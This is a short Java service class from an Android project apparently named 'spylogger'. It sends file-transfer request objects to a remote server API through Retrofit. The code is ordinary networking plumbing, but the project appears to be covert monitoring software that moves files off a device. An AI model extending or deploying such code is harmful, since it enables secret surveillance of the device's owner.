package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;

import java.util.List;

import retrofit2.Call;

/**
 * Created by bruno on 02/12/16.
 */

public class SendSolicitacoesArquivos extends SendDataService<List<Integer>> {

    public SendSolicitacoesArquivos(TaskComplete handler) {
        super(handler);
    }

    public void enviar(EnvioArquivoVO envioArquivoVO){
        Call<List<Integer>> call=sendApi.receberArquivos(envioArquivoVO);
        call.enqueue(this);
    }

}
